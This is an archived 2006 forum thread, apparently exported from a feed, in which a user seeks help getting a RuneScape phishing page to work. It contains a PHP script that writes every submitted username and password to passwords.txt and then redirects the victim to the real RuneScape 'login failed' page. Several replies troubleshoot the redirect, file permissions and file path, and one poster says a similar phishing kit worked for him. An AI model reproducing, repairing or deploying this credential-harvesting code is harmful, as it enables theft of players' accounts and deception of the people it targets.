channel.title: What else is wrong with this? - .php and .txt
channel.description:
Ok, ive gotten further now.. i changed all of the permissions of passwords.txt to 777, (do any of the other files etc.. next.php, index.htm need 777 permissions too?) but i do not think that i put the right link in next.php because its not saving the passwords i put in.. ive gotten even further now, because its not giving me a white page with a bunch of writing on it.. its giving me a go back and try again page after i put my password & username in.
but i do not think that i put the right link in next.php because its not saving the passwords i put in
In the next.php link, do i put in the link that i use to access the site ex.. www.freehost.com/member/poopy4231/x/passwords.txt
or
poopy4231.freehost.com/passwords.txt ? help is appricieated.

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @poopy4231 poopy4231
item.description:
@poopy4231 wrote:

Ok, ive gotten further now… i changed all of the permissions of passwords.txt to 777, (do any of the other files etc… next.php, index.htm need 777 permissions too?) but i do not think that i put the right link in next.php because its not saving the passwords i put in… ive gotten even further now, because its not giving me a white page with a bunch of writing on it… its giving me a go back and try again page after i put my password & username in.

but i do not think that i put the right link in next.php because its not saving the passwords i put in

In the next.php link, do i put in the link that i use to access the site ex… www.freehost.com/member/poopy4231/x/passwords.txt

or

poopy4231.freehost.com/passwords.txt ? help is appricieated.

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @jme jme
item.description:
@jme wrote:

frank_:

You seem to be going well so far i know a bit of php, if you wanna pm me your msn address ill try to help you out

Bandit made it, and poopy downloaded it most likely to try and scam, but anyways yeah I tried helping him but I give up. When you want something this bad, theres got to be a deeper reason.

Anyways, I also tested this out on my personal site(along with some of his other phishers), and it worked for me just by changing to location of password.txt to the direct link.

Perhaps password.txt needs better permissions, so that guests can “write it,” I suggest you use a ftp client such as cuteftp(my personal fav).

Read full topic

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @poopy4231 poopy4231
item.description:
@poopy4231 wrote:

Yeah, i was testing it out… I really want to try this and see if it works, ive never done any php or html before, this is my first…

What should i change to make this save the passwords… because i see in my link it says:

http://poopy4231.sitesled.com/next.php?username=sdadsasda&password=dsasda&=

Then i get this: $value) { fwrite($handle, $variable); fwrite($handle, “=”); fwrite($handle, $value); fwrite($handle, “\r\n”); } fwrite($handle, “\r\n”); fclose($handle); exit; ?>

My link is: http://poopy4231.sitesled.com/

Read full topic
item.source: What else is wrong with this? - .php and .txt

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @frank frank_
item.description:
@frank wrote:

well, the name and password is sent over https as POST variables, and you probably arent correctly implementing the script.

is this meant for a phishing site or something?

Read full topic

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @frank frank_
item.description:
@frank wrote:

no, i mean, all that script will do is pull the GET variables, which are $mod and $dest, and removing header() was meant to show you that the location part will just make the page redirect.

Read full topic
item.source: What else is wrong with this? - .php and .txt

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @poopy4231 poopy4231
item.description:
@poopy4231 wrote:

Wait, im confused… I deleted everything besides the header… and what am i supposed to do with

a textfile that has mod=password
dest=passchange.html

? upload it to the server?

if i did that, then what would i do with ‘passwords.txt’ and how would the php know to save their password in the text file i create that has ‘mod=password
dest=passchange.html’

Read full topic
item.source: What else is wrong with this? - .php and .txt

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @frank frank_
item.description:
@frank wrote:

Just remove all of the code except the header method, it will send you to the page specified, then that page will send you to the runescape index.

and all it looks as though this will do (if it actually worked) is create a textfile like this:

mod=password
dest=passchange.html

Read full topic
item.source: What else is wrong with this? - .php and .txt

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @poopy4231 poopy4231
item.description:
@poopy4231 wrote:

fixed, but still doesnt work

<?php header("Location: https://www.runescape.com/lang/en/aff/runescape/loginfailed.ws?mod=password&dest=passchange.html"); $handle = fopen("http://poopy4231.sitesled.com/passwords.txt", "a"); foreach($_GET as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, " "); } fwrite($handle, " "); fclose($handle); exit; ?>[br][size=1]Posted at: June 14, 2006, 12:42:35 am[/size][hr][quote="frank_, post:4, topic:3846"]header("Location:......");

is a redirect, you will then be redirected by that rs page back to their index.[/quote]

What does that mean? How is that causing the problem

Read full topic
item.source: What else is wrong with this? - .php and .txt

item.title: What else is wrong with this? - .php and .txt
item.dc:creator: @frank frank_
item.description:
@frank wrote:

header(“Location:…”);
is a redirect, you will then be redirected by that rs page back to their index.
